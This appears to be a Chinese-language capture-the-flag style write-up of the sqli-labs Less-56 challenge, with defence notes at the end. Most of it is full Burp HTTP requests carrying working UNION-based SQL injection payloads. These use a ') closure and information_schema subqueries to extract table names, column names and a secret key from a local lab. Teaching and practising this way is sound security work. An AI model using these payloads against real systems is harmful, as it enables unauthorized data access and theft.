## 题目: Sqli‑labs Less‑56

## 题目描述
GET参数id，单引号+圆括号混合闭合UNION注入，Challenge挑战关卡。目标库`challenges`，表名、secret列名、key每次Reset随机生成；总共有**14次请求机会**，超过次数自动重置全部数据；SQL语句为`id=('$id')`，payload需要使用`')`完成闭合。页面回显UNION查询第2、3列，尽量少请求拿到secret key提交通关。

## 核心原理
```php
$sql = "SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";
```
关键点：id 被圆括号与单引号双层包裹，必须`')`闭合，单独`'`或者`)`都会语法错误；页面回显第 2、3 列；每请求 id 参数计数 + 1，上限 14 次；页面 Reset 仅返回 refresh 头，脚本需要直接访问 setup 脚本完成重建随机库；目标数据存放在 challenges 库；首次访问页面生成 challenge 会话 Cookie，Cookie 丢失本次挑战数据失效。

**解题思路**
1. 访问 setup 重置脚本，生成全新随机环境，获取 challenge 会话 cookie；
2. Burp 抓包修改 id 参数，使用`')`闭合，确认 UNION 回显位置；
3. UNION 嵌套子查询一次性获取 challenges 库随机表名与 secret 列名；
4. UNION 查询读取 secret key；
5. POST 提交 secret key 完成通关。

## 解题步骤
### 1. 确认闭合与回显位 Burp 包
```
GET /sqli-labs/Less-56/?id=-1') union select 1,2,3 -- - HTTP/1.1
Host: 127.0.0.1
```
页面`Your Login name:2`、`Your Password:3`，确认 2、3 列为回显位，消耗 1 次尝试次数。

### 2. 获取随机表名与 secret 列名 Burp 包
```
GET /sqli-labs/Less-56/?id=-1') union select 1,(select table_name from information_schema.tables where table_schema='challenges'),(select column_name from information_schema.columns where table_schema='challenges' limit 2,1) -- - HTTP/1.1
Host: 127.0.0.1
```
`Your Login name`返回随机表名，`Your Password`返回`secret_xxxx`列名。

### 3. 获取 secret key Burp 包
> 
> 将 payload 中`0aphpbbksu`替换实际表名，`secret_14YW`替换实际 secret 列名
```
GET /sqli-labs/Less-56/?id=-1') union select 1,(select secret_14YW from 0aphpbbksu),3 -- - HTTP/1.1
Host: 127.0.0.1
```
页面回显拿到 secret key 字符串。

### 4. 提交 key Burp 包
```
POST /sqli-labs/Less-56/index.php HTTP/1.1
Host: 127.0.0.1
Content‑Type: application/x‑www‑form‑urlencoded

key=6v138Tv23IClKoVigwFhxiH0&answer_key=Submit
```
页面出现`Less‑54‑1.jpg`图片即为通关（复用 54 关卡成功图片）。

## 踩坑记录
1. 闭合必须使用`')`，单独`'`或者`)`都无法正常执行注入。
2. 页面 Reset 按钮仅刷新页面，脚本环境需要直接访问`setup‑db‑challenge.php`才真正重建 challenges 库。
3. 需要先访问挑战页面拿到 challenge Cookie，否则无法绑定本次随机挑战数据。
4. 通关图片文件名依旧是`Less‑54‑1.jpg`，不要误认为通关失败。
5. 上限 14 次机会，利用 union 嵌套子查询，单次请求拿多条信息节约尝试次数。
6. setup 脚本会 drop 重建 challenges 库，会清空 54‑56 全部挑战关卡数据。

## 知识点总结
- Challenge 系列闭合对比：54 单引号`'`、55 括号`)`、56 单引号括号混合`')`。
- `id=('$id')`闭合技巧：先闭合单引号再闭合括号，payload 前缀为`')`。
- 重置机制：`setup‑db‑challenge.php`删除重建 challenges 库，生成随机表、secret 字段。
- 限次注入思路：union 嵌套子查询合并查询结果，减少 HTTP 请求消耗尝试次数。
- 防御：预编译参数绑定；接口请求次数限制；随机表名仅提升攻击门槛，不能当做安全防御手段。
